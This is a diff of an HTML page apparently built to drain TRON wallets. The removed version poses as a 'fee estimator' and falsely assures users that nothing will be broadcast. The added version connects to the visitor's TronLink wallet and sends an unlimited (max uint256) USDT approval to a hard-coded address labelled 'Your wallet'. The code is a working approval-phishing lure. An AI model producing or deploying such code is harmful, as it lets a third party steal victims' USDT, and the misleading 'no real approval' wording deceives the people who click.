@@ -1,72 +1,53 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TRC‑20 Fee Estimator</title>
-  <style>
-    body { font-family: Arial, sans-serif; background: #111; color: #fff; text-align: center; padding: 40px; }
-    button { padding: 15px 25px; font-size: 18px; border: none; border-radius: 8px; background: #29abe2; color: white; cursor: pointer; }
-    #result { margin-top: 20px; font-size: 18px; }
-  </style>
+  <meta charset="UTF-8">
+  <title>TRC20 USDT Approval</title>
+  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-tronlink"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.5.0/dist/TronWeb.js"></script>
 </head>
 <body>
-  <h1>TRC‑20 Unlimited Approval Fee Estimator</h1>
-  <p>Click below and allow any popup—no real approval will be broadcast.</p>
-  <button id="runBtn">Estimate Approval Fee</button>
-  <div id="result"></div>
+  <button id="approveBtn">Approve USDT</button>
 
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
   <script>
-    const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const SPENDER = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
-    const AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT Contract
+    const RECEIVER_ADDRESS = 'TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN'; // Your wallet
 
-    async function estimateFee() {
-      const el = document.getElementById("result");
-      el.textContent = "Checking for wallet...";
-
-      if (!window.tronWeb || !window.tronWeb.defaultAddress?.base58) {
-        el.textContent = "Please open this page inside SafePal / TokenPocket / OKX...";
-        try {
-          await window.tronWeb.request({ method: "tron_requestAccounts" });
-        } catch {
-          el.textContent = "Wallet connect failed.";
-        }
-        return;
+    const connectWallet = async () => {
+      if (window.tronWeb && window.tronWeb.ready) {
+        return window.tronWeb.defaultAddress.base58;
+      } else {
+        console.log("Waiting for TronLink...");
+        return new Promise(resolve => {
+          const check = setInterval(() => {
+            if (window.tronWeb && window.tronWeb.ready) {
+              clearInterval(check);
+              resolve(window.tronWeb.defaultAddress.base58);
+            }
+          }, 1000);
+        });
       }
+    };
 
-      const from = window.tronWeb.defaultAddress.base58;
-      el.textContent = "Estimating energy and fee...";
+    const approveUSDT = async () => {
+      const userAddress = await connectWallet();
+
+      const tronWeb = window.tronWeb;
+      const usdtContract = await tronWeb.contract().at(CONTRACT_ADDRESS);
+
+      const amount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Max uint256
 
       try {
-        const resp = await tronWeb.transactionBuilder.triggerSmartContract(
-          CONTRACT,
-          "approve(address,uint256)",
-          {},
-          [
-            { type: "address", value: SPENDER },
-            { type: "uint256", value: AMOUNT }
-          ],
-          from
-        );
-
-        const energyUsed = resp.energy_usage_total ?? resp.constant_result ?? 0;
-        const feeSun = resp.transaction.raw_data.fee_limit;
-        const feeTrx = feeSun / 1_000_000;
-
-        el.innerHTML = `
-          Estimated Energy: <strong>${energyUsed}</strong><br/>
-          Fee Limit (allowed): <strong>${feeTrx.toFixed(3)} TRX</strong>
-        `;
-        alert(`Energy: ${energyUsed}, Fee Limit: ${feeTrx.toFixed(3)} TRX`);
+        const tx = await usdtContract.approve(RECEIVER_ADDRESS, amount).send(); // 👈 No feeLimit passed
+        console.log("Approval TX:", tx);
+        alert("Approval Transaction Sent!");
       } catch (err) {
-        console.error(err);
-        el.textContent = "Estimation failed: " + (err.message || err);
+        console.error("Approval Error:", err);
+        alert("Approval Failed: " + err.message);
       }
-    }
+    };
 
-    document.getElementById("runBtn").addEventListener("click", estimateFee);
+    document.getElementById('approveBtn').addEventListener('click', approveUSDT);
   </script>
 </body>
 </html>
